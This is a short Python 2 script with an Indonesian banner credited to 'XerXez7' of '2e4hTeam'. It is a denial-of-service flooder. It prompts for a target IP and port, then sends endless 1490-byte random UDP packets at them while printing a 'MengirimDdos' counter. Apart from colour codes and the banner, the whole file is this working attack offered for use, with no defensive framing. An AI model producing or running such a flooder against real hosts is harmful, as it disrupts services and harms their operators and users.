#Compiled InYoyurXerXez7
#2e4hTeam
#Kiya
import os
import sys
import time
from time import sleep

g = "\033[32;1m"
gt = "\033[0;32m"
bt = "\033[34;1m"
b = "\033[36;1m"
m = "\033[31;1m"
c = "\033[0m"
p = "\033[37;1m"
u = "\033[35;1m"
M = "\033[3;1m"
k = "\033[33;1m"
kt = "\033[0;33m"
a = "\033[30;1m"

W = "\x1b[0m"
R = "\x1b[31m"
G = "\x1b[1;32m"
O = "\x1b[33m"
B = "\x1b[34m"
P = "\x1b[35m"
C = "\x1b[36m"
GR = "\x1b[37m"

import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet XerXez|lolcat")
print "(:)~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(:)"
print "|Nick     : InYour XerXez7       :|"
print "|Sosmed   : @Oficial_XerXez7     :|"
print "|ThankTo  : Friends && Allah SwT :|"
print "|         :                      :|"
print "|Team     : 2e4h~Buft            :|"
print "(:)~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(:)"
print
ip = raw_input("\033[34;1mMasukkan IP Target : ")
port = input("\033[34;1mMasukkan Port      : ")

os.system("clear")
os.system("figlet Play|lolcat")
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 0
     print "=> %s packet => %s MengirimDdos:%s"%(sent,ip,port)
     if port == 65534:
       port = 0
